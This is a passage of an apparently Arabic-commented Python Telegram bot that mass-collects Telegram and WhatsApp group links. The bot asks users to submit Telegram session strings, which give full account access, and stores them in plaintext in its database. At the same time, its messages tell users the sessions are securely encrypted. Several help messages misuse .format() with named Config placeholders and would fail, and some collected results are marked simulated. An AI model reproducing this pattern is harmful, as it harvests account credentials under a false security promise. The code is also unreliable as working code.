                'metadata': {
                    'collected_at': datetime.now().isoformat(),
                    'simulated': True
                },
                'tags': ['telegram', 'group'],
                'source': 'simulation'
            })
        
        return collected
    
    def _update_stats(self, link_info: Dict):
        """تحديث الإحصائيات"""
        platform = EnhancedLinkProcessor.extract_url_info(link_info['url'])['platform']
        
        if platform == 'telegram':
            if '+joinchat' in link_info['url'] or 'joinchat/' in link_info['url']:
                self.stats['telegram_join'] += 1
            elif 'channel' in link_info['url'] or '/c/' in link_info['url']:
                self.stats['telegram_channels'] += 1
            else:
                self.stats['telegram_groups'] += 1
        
        self.stats['total_collected'] += 1
    
    async def _graceful_shutdown(self):
        """تنفيذ إغلاق سلس"""
        logger.info("بدء الإغلاق السلس لنظام الجمع...")
        
        self.active = False
        self.paused = False
        self.stats['end_time'] = datetime.now()
        
        logger.info(f"✅ اكتمل الإغلاق السلس. الإحصائيات: {self.stats}")
    
    def get_status(self) -> Dict:
        """الحصول على حالة الجمع"""
        return {
            'active': self.active,
            'paused': self.paused,
            'stop_requested': self.stop_requested,
            'stats': self.stats.copy(),
            'timestamp': datetime.now().isoformat()
        }

# ======================
# Advanced Telegram Bot - بوت تيليجرام المتقدم
# ======================

class AdvancedTelegramBot:
    """بوت تيليجرام متقدم بمميزات جمع غير محدودة"""
    
    def __init__(self):
        self.collection_manager = AdvancedCollectionManager()
        self.application = None
        self.user_states = {}
        
    async def start(self):
        """بدء تشغيل البوت"""
        try:
            # إنشاء التطبيق
            self.application = ApplicationBuilder().token(Config.BOT_TOKEN).build()
            
            # إضافة المعالجات
            await self._setup_handlers()
            
            # بدء البوت
            await self.application.initialize()
            await self.application.start()
            
            logger.info("✅ البوت يعمل بنجاح!")
            
            # الحفاظ على البوت يعمل
            if Config.USE_WEBHOOK:
                await self.application.bot.set_webhook(Config.WEBHOOK_URL)
                logger.info(f"🔗 Webhook معين على: {Config.WEBHOOK_URL}")
            else:
                await self.application.updater.start_polling()
                logger.info("🔄 بدء ال polling")
            
            # انتظار الإشارات
            await asyncio.Event().wait()
            
        except Exception as e:
            logger.error(f"❌ خطأ في تشغيل البوت: {e}", exc_info=True)
            raise
    
    async def _setup_handlers(self):
        """إعداد معالجات الأوامر"""
        # الأمر /start
        self.application.add_handler(CommandHandler("start", self.start_command))
        
        # الأمر /help
        self.application.add_handler(CommandHandler("help", self.help_command))
        
        # الأمر /status
        self.application.add_handler(CommandHandler("status", self.status_command))
        
        # الأمر /stats
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        
        # الأمر /collect
        self.application.add_handler(CommandHandler("collect", self.collect_command))
        
        # الأمر /sessions
        self.application.add_handler(CommandHandler("sessions", self.sessions_command))
        
        # الأمر /export
        self.application.add_handler(CommandHandler("export", self.export_command))
        
        # الأمر /backup
        self.application.add_handler(CommandHandler("backup", self.backup_command))
        
        # معالجة الاستدعاءات
        self.application.add_handler(CallbackQueryHandler(self.callback_handler))
        
        # معالجة الرسائل النصية
        self.application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            self.message_handler
        ))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /start"""
        user = update.effective_user
        
        # التحقق من صلاحية المستخدم
        if Config.ADMIN_USER_IDS and user.id not in Config.ADMIN_USER_IDS:
            if Config.ALLOWED_USER_IDS and user.id not in Config.ALLOWED_USER_IDS:
                await update.message.reply_text("❌ عذراً، ليس لديك صلاحية الوصول إلى هذا البوت.")
                return
        
        # إضافة/تحديث المستخدم في قاعدة البيانات
        db = await EnhancedDatabaseManager.get_instance()
        await db.add_or_update_user(
            user.id,
            user.username,
            user.first_name,
            user.last_name
        )
        
        # حفظ حالة المستخدم
        self.user_states[user.id] = {
            'last_command': 'start',
            'timestamp': datetime.now()
        }
        
        # إنشاء لوحة المفاتيح الرئيسية
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 بدء الجمع", callback_data="start_collect")],
            [InlineKeyboardButton("⏸️ إيقاف مؤقت", callback_data="pause_collect")],
            [InlineKeyboardButton("⏹️ إيقاف الجمع", callback_data="stop_collect")],
            [InlineKeyboardButton("📊 حالة النظام", callback_data="system_status")],
            [InlineKeyboardButton("📈 الإحصائيات", callback_data="show_stats")],
            [InlineKeyboardButton("📤 تصدير الروابط", callback_data="export_links")],
            [InlineKeyboardButton("➕ إضافة جلسة", callback_data="add_session")],
            [InlineKeyboardButton("❓ المساعدة", callback_data="show_help")]
        ])
        
        welcome_text = f"""
🤖 **مرحباً {user.first_name}!**

**بوت جمع الروابط الذكي المتقدم**

✨ **المميزات الرئيسية:**
• 📢 جمع روابط تيليجرام بدون قيود زمنية
• 📱 جمع مجموعات واتساب (آخر 30 يوماً)
• 🔍 كشف ذكي للمجموعات والقنوات
• ⚡ أداء عالي وسرعة في الجمع
• 🔒 أمان وتشفير للبيانات

🔥 **الحدود المحسنة:**
• أقصى {Config.MAX_CONCURRENT_SESSIONS} جلسة متزامنة
• أقصى {Config.MAX_EXPORT_LINKS:,} رابط للتصدير
• أقصى {Config.MAX_SESSIONS_PER_USER} جلسة لكل مستخدم

**🚀 ابدأ الآن باستخدام الأزرار أدناه!**
"""
        
        await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /help"""
        help_text = """
🆘 **دليل استخدام البوت**

📋 **الأوامر المتاحة:**

/start - بدء استخدام البوت
/help - عرض هذه المساعدة
/status - حالة النظام والجمع
/stats - إحصائيات النظام
/collect - إدارة عملية الجمع
/sessions - إدارة الجلسات
/export - تصدير الروابط
/backup - نسخ احتياطي

🎯 **كيفية الاستخدام:**

1. **إضافة جلسة:** أرسل جلسة تيليجرام الخاصة بك
2. **بدء الجمع:** اضغط على "🚀 بدء الجمع"
3. **مراقبة النتائج:** استخدم "📊 حالة النظام"
4. **تصدير الروابط:** استخدم "📤 تصدير الروابط"

🔧 **للإبلاغ عن مشاكل:**
تواصل مع المطور إذا واجهت أي مشاكل.
"""
        
        await update.message.reply_text(help_text, parse_mode="Markdown")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /status"""
        status = self.collection_manager.get_status()
        
        status_text = f"""
📊 **حالة النظام - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**

**🔧 حالة الجمع:**
"""
        
        if status['active']:
            if status['paused']:
                status_text += "⏸️ **موقف مؤقتاً**\n"
            elif status['stop_requested']:
                status_text += "🛑 **جاري الإيقاف...**\n"
            else:
                status_text += "🔄 **نشط**\n"
                
                if status['stats']['start_time']:
                    duration = datetime.now() - status['stats']['start_time']
                    hours = int(duration.total_seconds() // 3600)
                    minutes = int((duration.total_seconds() % 3600) // 60)
                    status_text += f"   ⏱️ المدة: {hours} ساعة {minutes} دقيقة\n"
                    status_text += f"   🔄 الدورات: {status['stats']['cycles_completed']}\n"
        else:
            status_text += "🛑 **متوقف**\n"
        
        status_text += f"""
**📈 إحصائيات الجمع:**
• 📦 المجموع: {status['stats']['total_collected']:,}
• 📢 تيليجرام: {status['stats']['telegram_groups'] + status['stats']['telegram_channels']:,}
• 📱 واتساب: {status['stats']['whatsapp_groups']:,}
• 🔄 مكررات: {status['stats']['duplicates']:,}
• ❌ أخطاء: {status['stats']['errors']:,}

**⚡ أداء النظام:**
• 🎯 درجة الأداء: {status['stats']['performance_score']:.1f}/100
• 💾 الذاكرة المستخدمة: {psutil.Process().memory_info().rss / 1024 / 1024:.1f} MB

**🔥 الحدود المحسنة:**
• أقصى جلسات متزامنة: {Config.MAX_CONCURRENT_SESSIONS}
• أقصى تصدير روابط: {Config.MAX_EXPORT_LINKS:,}
• أقصى جلسات لكل مستخدم: {Config.MAX_SESSIONS_PER_USER}
"""
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 تحديث", callback_data="refresh_status"),
             InlineKeyboardButton("🚀 بدء الجمع", callback_data="start_collect")],
            [InlineKeyboardButton("📊 إحصائيات كاملة", callback_data="full_stats"),
             InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await update.message.reply_text(status_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /stats"""
        try:
            db = await EnhancedDatabaseManager.get_instance()
            stats = await db.get_stats_summary_enhanced(detailed=True)
            
            stats_text = f"""
📈 **إحصائيات النظام الشاملة**

**📊 إحصائيات عامة:**
• إجمالي الروابط: {stats.get('total_links', 0):,}
• الجلسات النشطة: {stats.get('active_sessions', 0)}
• المستخدمين: {stats.get('total_users', 0)}

**🌐 الروابط حسب المنصة:**
"""
            
            for platform, count in stats.get('links_by_platform', {}).items():
                stats_text += f"• {platform}: {count:,}\n"
            
            stats_text += "\n**📢 تفاصيل تيليجرام:**\n"
            
            for detail in stats.get('telegram_details', []):
                type_name = detail['type'] or 'غير معروف'
                if detail['is_channel']:
                    type_name = 'قناة'
                elif detail['is_group']:
                    type_name = 'مجموعة'
                elif detail['is_join_request']:
                    type_name = 'طلب انضمام'
                
                stats_text += f"• {type_name}: {detail['count']:,}\n"
            
            stats_text += f"""
**💾 قاعدة البيانات:**
• حجم الملف: {os.path.getsize(Config.DB_PATH) / 1024 / 1024:.2f} MB
• آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M')}

**🔄 آخر تحديث: {datetime.now().strftime('%H:%M:%S')}**
"""
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data="refresh_stats"),
                 InlineKeyboardButton("📥 تصدير البيانات", callback_data="export_data")],
                [InlineKeyboardButton("📋 تقرير مفصل", callback_data="detailed_report"),
                 InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
            ])
            
            await update.message.reply_text(stats_text, reply_markup=keyboard, parse_mode="Markdown")
            
        except Exception as e:
            logger.error(f"خطأ في عرض الإحصائيات: {e}")
            await update.message.reply_text("❌ حدث خطأ في عرض الإحصائيات.")
    
    async def collect_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /collect"""
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 بدء الجمع", callback_data="start_collect")],
            [InlineKeyboardButton("⏸️ إيقاف مؤقت", callback_data="pause_collect")],
            [InlineKeyboardButton("⏹️ إيقاف", callback_data="stop_collect")],
            [InlineKeyboardButton("📊 حالة الجمع", callback_data="collect_status")],
            [InlineKeyboardButton("⚙️ إعدادات", callback_data="collect_settings")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        collect_text = """
🚀 **نظام الجمع المتقدم**

**🎯 وضع التشغيل الحالي:**
• تيليجرام: جمع غير محدود ✅
• واتساب: آخر 30 يوماً فقط ✅
• التحقق المتقدم: مفعل ✅

**⚡ سرعة الجمع:**
• وضع سريع: 5-10 روابط/ثانية
• وضع عادي: 2-5 روابط/ثانية
• وضع آمن: 1-2 روابط/ثانية

**🔧 الإعدادات الحالية:**
• أقصى جلسات متزامنة: {Config.MAX_CONCURRENT_SESSIONS}
• تأخير بين الدورات: {Config.REQUEST_DELAYS['min_cycle_delay']} ثانية
• حد الروابط/دورة: {Config.MAX_LINKS_PER_CYCLE}

**📋 التعليمات:**
1. اضغط '🚀 بدء الجمع' للبدء
2. استخدم '⏸️ إيقاف مؤقت' للتوقف المؤقت
3. استخدم '📊 حالة الجمع' للمتابعة
4. استخدم '⏹️ إيقاف' للتوقف النهائي
""".format(
    Config.MAX_CONCURRENT_SESSIONS,
    Config.REQUEST_DELAYS['min_cycle_delay'],
    Config.MAX_LINKS_PER_CYCLE
)
        
        await update.message.reply_text(collect_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def sessions_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /sessions"""
        sessions_text = """
💼 **إدارة الجلسات**

**📋 معلومات الجلسات:**
• الحد الأقصى لكل مستخدم: {Config.MAX_SESSIONS_PER_USER}
• الجلسات المتزامنة: {Config.MAX_CONCURRENT_SESSIONS}
• مهلة الجلسة: {Config.SESSION_TIMEOUT} ثانية

**🎯 كيف تضيف جلسة:**
أرسل جلسة تيليجرام الخاصة بك في الرسالة التالية.

**📝 مثال للجلسة:**
1Fq3Y5v7x9z0B2D4F6H8J0L2N4P6R8T0V2X4Z6B8D0F2H4J6L8N0P2R4T6V8X0Z2B4D6F8H0J2L4...

**⚠️ ملاحظات هامة:**
• الجلسات مشفرة بأمان
• يمكنك إضافة حتى {Config.MAX_SESSIONS_PER_USER} جلسة
• الجلسات غير النشطة تحذف بعد {Config.SESSION_TIMEOUT} ثانية
""".format(
    Config.MAX_SESSIONS_PER_USER,
    Config.MAX_CONCURRENT_SESSIONS,
    Config.SESSION_TIMEOUT,
    Config.MAX_SESSIONS_PER_USER,
    Config.SESSION_TIMEOUT
)
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ إضافة جلسة", callback_data="add_session")],
            [InlineKeyboardButton("👁️ عرض الجلسات", callback_data="view_sessions")],
            [InlineKeyboardButton("🗑️ حذف جلسة", callback_data="delete_session")],
            [InlineKeyboardButton("🔄 تحديث", callback_data="refresh_sessions")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await update.message.reply_text(sessions_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /export"""
        export_text = f"""
📤 **تصدير الروابط**

**📊 إحصائيات التصدير:**
• الحد الأقصى للتصدير: {Config.MAX_EXPORT_LINKS:,} رابط
• حجم الدفعة: {Config.EXPORT_CHUNK_SIZE:,} رابط
• التنسيقات المدعومة: TXT, CSV, JSON

**🎯 خيارات التصدير:**

1. **تصدير كامل:** جميع الروابط
2. **تصدير حسب المنصة:** تيليجرام، واتساب، إلخ
3. **تصدير حسب النوع:** مجموعات، قنوات، طلبات انضمام
4. **تصدير حسب التاريخ:** روابط محددة حسب التاريخ

**📋 التعليمات:**
1. اختر نوع التصدير
2. حدد عدد الروابط (الحد: {Config.MAX_EXPORT_LINKS:,})
3. انتظر حتى اكتمال التصدير
4. سيتم إرسال الملف لك
"""
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 تصدير الكل", callback_data="export_all")],
            [InlineKeyboardButton("📱 تصدير تيليجرام", callback_data="export_telegram")],
            [InlineKeyboardButton("📲 تصدير واتساب", callback_data="export_whatsapp")],
            [InlineKeyboardButton("⚙️ تصدير مخصص", callback_data="export_custom")],
            [InlineKeyboardButton("📊 إحصائيات", callback_data="export_stats")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await update.message.reply_text(export_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def backup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر /backup"""
        backup_text = """
💾 **نظام النسخ الاحتياطي**

**📋 معلومات النسخ:**
• النسخ التلقائي: {Config.BACKUP_ENABLED}
• أقصى عدد للنسخ: {Config.MAX_BACKUPS}
• حجم قاعدة البيانات: {:.2f} MB

**🔄 كيف يعمل:**
1. إنشاء نسخة احتياطية تلقائية
2. حفظ النسخ في مجلد 'backups'
3. تدوير النسخ القديمة تلقائياً
4. يمكن استعادة البيانات عند الحاجة

**🎯 الخيارات المتاحة:**
""".format(
    Config.BACKUP_ENABLED,
    Config.MAX_BACKUPS,
    os.path.getsize(Config.DB_PATH) / 1024 / 1024 if os.path.exists(Config.DB_PATH) else 0
)
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 إنشاء نسخة", callback_data="create_backup")],
            [InlineKeyboardButton("👁️ عرض النسخ", callback_data="view_backups")],
            [InlineKeyboardButton("🗑️ حذف نسخة", callback_data="delete_backup")],
            [InlineKeyboardButton("📥 استعادة", callback_data="restore_backup")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await update.message.reply_text(backup_text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة الاستدعاءات"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        user = query.from_user
        
        logger.info(f"استدعاء من المستخدم {user.id}: {data}")
        
        try:
            if data == "start_collect":
                await self._handle_start_collection(query)
            elif data == "pause_collect":
                await self._handle_pause_collection(query)
            elif data == "stop_collect":
                await self._handle_stop_collection(query)
            elif data == "collect_status":
                await self._handle_collect_status(query)
            elif data == "system_status":
                await self.status_command(update, context)
            elif data == "show_stats":
                await self.stats_command(update, context)
            elif data == "export_links":
                await self.export_command(update, context)
            elif data == "add_session":
                await self._handle_add_session(query)
            elif data == "show_help":
                await self.help_command(update, context)
            elif data == "main_menu":
                await self._show_main_menu(query)
            elif data == "refresh_status":
                await self._handle_refresh_status(query)
            elif data == "refresh_stats":
                await self._handle_refresh_stats(query)
            elif data == "full_stats":
                await self._handle_full_stats(query)
            elif data == "collect_settings":
                await self._handle_collect_settings(query)
            else:
                await query.edit_message_text("❌ أمر غير معروف، الرجاء المحاولة مرة أخرى.")
        
        except Exception as e:
            logger.error(f"خطأ في معالجة الاستدعاء: {e}", exc_info=True)
            await query.edit_message_text(f"❌ حدث خطأ: {str(e)[:100]}")
    
    async def _handle_start_collection(self, query):
        """معالجة بدء الجمع"""
        if self.collection_manager.active:
            await query.edit_message_text("⏳ الجمع يعمل بالفعل!")
            return
        
        # بدء الجمع في خلفية منفصلة
        asyncio.create_task(self.collection_manager.start_collection())
        
        await query.edit_message_text(
            "🚀 **بدأت عملية الجمع!**\n\n"
            "جاري جمع الروابط من جميع المصادر...\n"
            "⏱️ الوقت المقدر: 1-5 دقائق\n"
            "📊 سيتم عرض النتائج عند الانتهاء\n\n"
            "يمكنك متابعة التقدم باستخدام /status",
            parse_mode="Markdown"
        )
    
    async def _handle_pause_collection(self, query):
        """معالجة إيقاف الجمع مؤقتاً"""
        if not self.collection_manager.active:
            await query.edit_message_text("⚠️ الجمع غير نشط حالياً")
            return
        
        self.collection_manager.paused = True
        await query.edit_message_text(
            "⏸️ **تم إيقاف الجمع مؤقتاً**\n\n"
            "يمكنك استئناف الجمع بالضغط على '🚀 بدء الجمع'\n"
            "أو إيقافه نهائياً بالضغط على '⏹️ إيقاف'",
            parse_mode="Markdown"
        )
    
    async def _handle_stop_collection(self, query):
        """معالجة إيقاف الجمع"""
        if not self.collection_manager.active:
            await query.edit_message_text("⚠️ الجمع غير نشط حالياً")
            return
        
        self.collection_manager.stop_requested = True
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ تأكيد الإيقاف", callback_data="confirm_stop")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_stop")]
        ])
        
        await query.edit_message_text(
            "⏹️ **تأكيد إيقاف الجمع**\n\n"
            "هل أنت متأكد من إيقاف الجمع؟\n\n"
            "**ملاحظة:**\n"
            "• سيتم حفظ جميع الروابط المجمعة\n"
            "• سيتوقف الجمع فوراً\n"
            "• يمكنك إعادة التشغيل في أي وقت",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    
    async def _handle_collect_status(self, query):
        """معالجة حالة الجمع"""
        status = self.collection_manager.get_status()
        
        text = f"""
📊 **حالة الجمع التفصيلية**

**الحالة:** {"🔄 نشط" if status['active'] else "🛑 متوقف"}
**الإيقاف المؤقت:** {"⏸️ نعم" if status['paused'] else "▶️ لا"}
**طلب الإيقاف:** {"✅ نعم" if status['stop_requested'] else "❌ لا"}

**الإحصائيات:**
• الروابط المجمعة: {status['stats']['total_collected']:,}
• دورات الجمع: {status['stats']['cycles_completed']:,}
• الأخطاء: {status['stats']['errors']:,}
• انتظارات Flood: {status['stats']['flood_waits']:,}

**تيليجرام:**
• المجموعات العامة: {status['stats']['telegram_public']:,}
• المجموعات الخاصة: {status['stats']['telegram_private']:,}
• طلبات الانضمام: {status['stats']['telegram_join']:,}
• القنوات: {status['stats']['telegram_channels']:,}
• المجموعات العادية: {status['stats']['telegram_groups']:,}
• المجموعات الخارقة: {status['stats']['telegram_supergroups']:,}

**أداء النظام:**
• درجة الأداء: {status['stats']['performance_score']:.1f}/100
"""
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 تحديث", callback_data="collect_status")],
            [InlineKeyboardButton("📋 تقرير كامل", callback_data="full_report")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def _handle_add_session(self, query):
        """معالجة إضافة جلسة"""
        await query.edit_message_text(
            "➕ **إضافة جلسة جديدة**\n\n"
            "أرسل جلسة تيليجرام الخاصة بك الآن.\n\n"
            "**📝 مثال:**\n"
            "1Fq3Y5v7x9z0B2D4F6H8J0L2N4P6R8T0V2X4Z6B8D0F2H4J6L8N0P2R4T6V8X0Z2B4D6F8H0J2L4...\n\n"
            "**⚠️ ملاحظات:**\n"
            "• الجلسات مشفرة بأمان\n"
            f"• يمكنك إضافة حتى {Config.MAX_SESSIONS_PER_USER} جلسة\n"
            "• الجلسات غير النشطة تحذف تلقائياً",
            parse_mode="Markdown"
        )
    
    async def _show_main_menu(self, query):
        """عرض القائمة الرئيسية"""
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 بدء الجمع", callback_data="start_collect")],
            [InlineKeyboardButton("⏸️ إيقاف مؤقت", callback_data="pause_collect")],
            [InlineKeyboardButton("⏹️ إيقاف الجمع", callback_data="stop_collect")],
            [InlineKeyboardButton("📊 حالة النظام", callback_data="system_status")],
            [InlineKeyboardButton("📈 الإحصائيات", callback_data="show_stats")],
            [InlineKeyboardButton("📤 تصدير الروابط", callback_data="export_links")],
            [InlineKeyboardButton("➕ إضافة جلسة", callback_data="add_session")],
            [InlineKeyboardButton("❓ المساعدة", callback_data="show_help")]
        ])
        
        await query.edit_message_text(
            "🏠 **القائمة الرئيسية**\n\n"
            "اختر من الخيارات أدناه:",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    
    async def _handle_refresh_status(self, query):
        """معالجة تحديث الحالة"""
        await self.status_command(query, None)
    
    async def _handle_refresh_stats(self, query):
        """معالجة تحديث الإحصائيات"""
        await self.stats_command(query, None)
    
    async def _handle_full_stats(self, query):
        """معالجة عرض الإحصائيات الكاملة"""
        try:
            db = await EnhancedDatabaseManager.get_instance()
            stats = await db.get_stats_summary_enhanced(detailed=True)
            
            text = f"""
📊 **الإحصائيات الكاملة**

**📈 إجمالي الروابط:** {stats.get('total_links', 0):,}

**🌐 التوزيع حسب المنصة:**
"""
            
            for platform, count in stats.get('links_by_platform', {}).items():
                percentage = (count / max(1, stats.get('total_links', 1))) * 100
                text += f"• {platform}: {count:,} ({percentage:.1f}%)\n"
            
            text += "\n**📢 تفاصيل تيليجرام:**\n"
            
            telegram_total = sum(detail['count'] for detail in stats.get('telegram_details', []))
            for detail in stats.get('telegram_details', []):
                type_name = detail['type'] or 'غير معروف'
                if detail['is_channel']:
                    type_name = '📢 قناة'
                elif detail['is_group']:
                    type_name = '👥 مجموعة'
                elif detail['is_join_request']:
                    type_name = '➕ طلب انضمام'
                
                percentage = (detail['count'] / max(1, telegram_total)) * 100
                text += f"• {type_name}: {detail['count']:,} ({percentage:.1f}%)\n"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data="full_stats")],
                [InlineKeyboardButton("📥 تصدير", callback_data="export_data")],
                [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
            ])
            
            await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")
            
        except Exception as e:
            logger.error(f"خطأ في عرض الإحصائيات الكاملة: {e}")
            await query.edit_message_text("❌ حدث خطأ في عرض الإحصائيات الكاملة.")
    
    async def _handle_collect_settings(self, query):
        """معالجة إعدادات الجمع"""
        text = f"""
⚙️ **إعدادات الجمع**

**الإعدادات الحالية:**
• وضع تيليجرام: {"✅ غير محدود" if Config.TELEGRAM_NO_TIME_LIMIT else "❌ محدود"}
• وضع واتساب: آخر {Config.WHATSAPP_DAYS_BACK} يوم
• التحقق المتقدم: {"✅ مفعل" if Config.ENABLE_ADVANCED_VALIDATION else "❌ معطل"}

**الحدود:**
• أقصى جلسات متزامنة: {Config.MAX_CONCURRENT_SESSIONS}
• الروابط لكل دورة: {Config.MAX_LINKS_PER_CYCLE}
• تأخير الدورة: {Config.REQUEST_DELAYS['min_cycle_delay']}-{Config.REQUEST_DELAYS['max_cycle_delay']} ثانية

**التأخيرات:**
• طبيعي: {Config.REQUEST_DELAYS['normal']} ثانية
• بحث: {Config.REQUEST_DELAYS['search']} ثانية
• انتظار Flood: {Config.REQUEST_DELAYS['flood_wait']} ثانية
"""
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⚡ تغيير السرعة", callback_data="change_speed")],
            [InlineKeyboardButton("📊 تعديل الحدود", callback_data="adjust_limits")],
            [InlineKeyboardButton("⏱️ تعديل التأخيرات", callback_data="adjust_delays")],
            [InlineKeyboardButton("🔄 إعادة التعيين", callback_data="reset_settings")],
            [InlineKeyboardButton("🏠 الرئيسية", callback_data="main_menu")]
        ])
        
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")
    
    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة الرسائل النصية"""
        user = update.effective_user
        message_text = update.message.text
        
        # التحقق إذا كانت رسالة جلسة
        if len(message_text) > 100 and '=' in message_text:
            await self._handle_session_message(update, message_text)
        else:
            await update.message.reply_text(
                "📝 **تم استلام رسالتك**\n\n"
                "إذا كنت تحاول إضافة جلسة، يرجى إرسال جلسة تيليجرام الصحيحة.\n"
                "استخدم /help لعرض التعليمات.",
                parse_mode="Markdown"
            )
    
    async def _handle_session_message(self, update: Update, session_string: str):
        """معالجة رسالة الجلسة"""
        user = update.effective_user
        
        try:
            # التحقق من صحة الجلسة
            client = TelegramClient(
                StringSession(session_string),
                Config.API_ID,
                Config.API_HASH,
                timeout=10
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.disconnect()
                await update.message.reply_text("❌ الجلسة غير مفعلة. يرجى إرسال جلسة صحيحة.")
                return
            
            me = await client.get_me()
            await client.disconnect()
            
            # حفظ الجلسة في قاعدة البيانات
            db = await EnhancedDatabaseManager.get_instance()
            
            session_hash = hashlib.md5(session_string.encode()).hexdigest()
            
            await db.conn.execute('''
                INSERT OR REPLACE INTO sessions 
                (session_string, session_hash, user_id, username, display_name, 
                 added_by_user, is_active, added_date)
                VALUES (?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
            ''', (
                session_string,
                session_hash,
                me.id,
                me.username or '',
                f"{me.first_name or ''} {me.last_name or ''}".strip(),
                user.id
            ))
            
            await db.conn.commit()
            await db.update_user_stats(user.id, 'session_added')
            
            await update.message.reply_text(
                f"✅ **تمت إضافة الجلسة بنجاح!**\n\n"
                f"👤 **المعلومات:**\n"
                f"• الاسم: {me.first_name or ''}\n"
                f"• المعرف: {me.id}\n"
                f"• اليوزر: @{me.username or 'غير متوفر'}\n\n"
                f"يمكنك الآن استخدام /collect لبدء الجمع.",
                parse_mode="Markdown"
            )
            
        except Exception as e:
            logger.error(f"خطأ في إضافة الجلسة: {e}")
            await update.message.reply_text(
                f"❌ **خطأ في إضافة الجلسة**\n\n"
                f"الخطأ: {str(e)[:200]}\n\n"
                f"تأكد من أن الجلسة صحيحة ومفعلة.",
                parse_mode="Markdown"
            )
    
    async def stop(self):
        """إيقاف البوت"""
        if self.application:
            await self.application.stop()
            logger.info("✅ تم إيقاف البوت")

# ======================
# Health Check Server - خادم فحص الصحة
# ======================

from fastapi import FastAPI
import uvicorn
from threading import Thread

class HealthCheckServer:
    """خادم فحص الصحة لـ Render"""
    
    def __init__(self):
        self.app = FastAPI()
        self.port = Config.PORT
        self.server = None
        
        @self.app.get("/")
        async def root():
            return {"status": "running", "service": "Telegram Link Collector"}
        
        @self.app.get("/health")
        async def health():
            try:
                memory_usage = psutil.Process().memory_info().rss / 1024 / 1024
                return {
                    "status": "healthy",
                    "timestamp": datetime.now().isoformat(),
                    "memory_mb": round(memory_usage, 2),
                    "database": os.path.exists(Config.DB_PATH)
                }
            except Exception as e:
                return {
                    "status": "error",
                    "error": str(e)
                }
    
    def start(self):
        """بدء الخادم"""
        def run():
            uvicorn.run(self.app, host="0.0.0.0", port=self.port, log_level="warning")
        
        self.server = Thread(target=run, daemon=True)
        self.server.start()
        logger.info(f"🌐 خادم فحص الصحة يعمل على المنفذ {self.port}")

# ======================
# Main Function - الوظيفة الرئيسية
# ======================

async def cleanup():
    """تنظيف الموارد"""
    logger.info("🧹 جاري تنظيف الموارد...")
    
    try:
        # إغلاق قاعدة البيانات
        db = await EnhancedDatabaseManager.get_instance()
        await db.close()
    except:
        pass
    
    logger.info("✅ اكتمل التنظيف")

def signal_handler(signum, frame):
    """معالجة الإشارات"""
    logger.info(f"📶 تم استقبال إشارة {signum}. جاري الإغلاق...")
    sys.exit(0)

async def main():
    """الدالة الرئيسية"""
    # إعداد معالجات الإشارات
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # تسجيل التنظيف عند الخروج
    atexit.register(lambda: asyncio.run(cleanup()))
    
    # التحقق من المتغيرات البيئية
    required_vars = ['BOT_TOKEN', 'API_ID', 'API_HASH']
    missing_vars = [var for var in required_vars if not os.getenv(var)]
    
    if missing_vars:
        logger.error(f"❌ متغيرات بيئية مفقودة: {missing_vars}")
